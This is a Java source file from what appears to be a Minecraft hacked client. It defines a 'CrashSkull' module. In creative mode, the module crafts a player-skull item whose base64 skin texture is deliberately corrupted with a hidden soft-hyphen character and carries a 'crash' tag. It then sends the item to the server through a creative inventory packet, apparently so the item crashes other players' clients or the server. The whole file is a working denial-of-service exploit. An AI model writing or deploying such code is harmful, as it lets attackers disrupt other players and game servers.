package store.shadowclient.client.module.misc;

import com.mojang.authlib.GameProfile;
import com.mojang.authlib.properties.Property;

import store.shadowclient.client.Shadow;
import store.shadowclient.client.module.Category;
import store.shadowclient.client.module.Module;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTUtil;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

public class CrashSkull extends Module {

	public CrashSkull() {
		super("CrashSkull", 0, Category.MISC);
	}
	
	@Override
    public void onEnable() {
        if (!mc.thePlayer.capabilities.isCreativeMode) {
        	Shadow.addChatMessage("Creative mode only.");
            toggle();
            return;
        }
        if (mc.thePlayer.inventory.getStackInSlot(0) != null) {
        	Shadow.addChatMessage("Please clear the first slot in your hotbar.");
            toggle();
            return;
        }
        final ItemStack item = new ItemStack(Items.skull, 1, 3);
        final NBTTagCompound nbt = new NBTTagCompound();
        final NBTTagCompound c = new NBTTagCompound();
        final GameProfile prof = new GameProfile(null, this.getName());
        prof.getProperties().put("textures", new Property("Value", "eyJ0ZXh0\u00addXJlcyI6eyJTS0lOIjp7InVybCI6IiJ9fX0="));
        c.setString("Id", "9d744c33-f3c4-4040-a7fc-73b47c840f0c");
        NBTUtil.writeGameProfile(c, prof);
        nbt.setTag("SkullOwner", c);
        nbt.setBoolean("crash", true);
        item.stackTagCompound = nbt;
        item.setStackDisplayName("Hold me :D");
        mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, item));
        toggle();
    }

}
